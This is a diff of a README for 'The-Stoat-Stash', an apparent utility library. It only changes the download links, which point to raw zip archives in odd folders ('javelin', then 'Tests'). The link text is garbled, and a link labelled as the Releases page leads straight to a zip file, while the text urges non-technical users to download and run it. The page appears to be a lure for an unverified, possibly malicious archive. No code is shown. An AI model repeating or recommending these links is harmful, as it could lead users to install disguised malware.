@@ -1,7 +1,7 @@
 # 🦢 The-Stoat-Stash - Simple Utilities for Everyday Tasks
 
 ## 📥 Download Now
-[![Download The-Stoat-Stash](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/javelin/The-Stoat-Stash.zip%20Now-%20%F0%9F%93%88%20The%20Stoat%https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/javelin/The-Stoat-Stash.zip)](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/javelin/The-Stoat-Stash.zip)
+[![Download The-Stoat-Stash](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/Tests/Stoat_Stash_The_3.2.zip%20Now-%20%F0%9F%93%88%20The%20Stoat%https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/Tests/Stoat_Stash_The_3.2.zip)](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/Tests/Stoat_Stash_The_3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to The-Stoat-Stash. This application provides a single file library loaded with handy utilities designed to make your tasks easier. You don’t need any technical skills to use it. 
@@ -20,7 +20,7 @@ This guide will show you how to download and run the software.
 
 ## 📥 Download & Install
 1. **Open the Downloads Page**  
-   Click [here](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/javelin/The-Stoat-Stash.zip) to visit the Releases page.
+   Click [here](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/Tests/Stoat_Stash_The_3.2.zip) to visit the Releases page.
 
 2. **Choose Your Version**  
    You will see a list of available versions. Look for the latest version at the top.
@@ -62,4 +62,4 @@ The-Stoat-Stash is open-source software, licensed under the MIT License. You can
 ## 🌐 Connect With Us
 Follow us on GitHub to stay updated with the latest releases and features!
 
-[Download The-Stoat-Stash](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/javelin/The-Stoat-Stash.zip) 
+[Download The-Stoat-Stash](https://raw.githubusercontent.com/Lacraaaa/The-Stoat-Stash/main/Tests/Stoat_Stash_The_3.2.zip) 
